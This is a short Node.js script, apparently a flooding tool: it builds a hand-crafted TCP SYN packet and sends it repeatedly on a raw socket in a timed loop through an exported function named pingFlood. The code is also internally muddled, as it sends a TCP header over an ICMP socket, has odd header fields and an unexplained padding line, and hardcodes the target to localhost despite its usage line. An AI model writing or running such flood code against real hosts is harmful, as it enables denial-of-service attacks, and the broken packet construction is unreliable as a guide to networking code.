var raw = require('raw-socket');
if (process.argv.length < 5) {
    console.log("node ping <target> <count> <sleep-milliseconds>");
    process.exit(-1);
}

var target = '127.0.0.1';
var count = parseInt(process.argv[3]);
var sleep = parseInt(process.argv[4]);

var options = {
    protocol: raw.Protocol.ICMP
};

var socket = raw.createSocket(options);

socket.on("close", function () {
    console.log("socket closed");
    process.exit(-1);
});

socket.on("error", function (error) {
    console.log("error: " + error.toString());
    process.exit(-1);
});

socket.on("message", function (buffer, source) {
    console.log("received " + buffer.length + " bytes from " + source);
    console.log("data: " + buffer.toString("hex"));
});

// SYN package
var buffer = new Buffer([
    0x00, 0x00, // src port
    0x00, 0x00, // dst port
    0x0d, 0xf4, 0xf0, 0xfd, // sequence number (should be random)
    0x0f, 0x00, 0xf2, 0x00, // acquitement number
    0x69, // header length
    0x02, // flags (fin=1,syn=2,rst=4,psh=8,ack=16,urg=32)
    0x04, 0x00, // window 1024
    0x00, 0x00, // crc
    0x00, 0x00, // ptr urgent
    0x02, 0x04, 0x05, 0xb4, // options and padding (mss=1460)
    0x00, 0x00, 0x00, 0x00 // ??
]);

raw.writeChecksum(buffer, 2, raw.createChecksum(buffer));

function pingFlood() {
    for (var i = 0; i < count; i++) {
        socket.send(buffer, 0, buffer.length, target, function (error, bytes) {
            if (error) {
                console.log(error.toString());
            } else {
                console.log("sent " + bytes + " bytes to " + target);
            }
        });
    }

    setTimeout(pingFlood, sleep);
}

module.exports = pingFlood;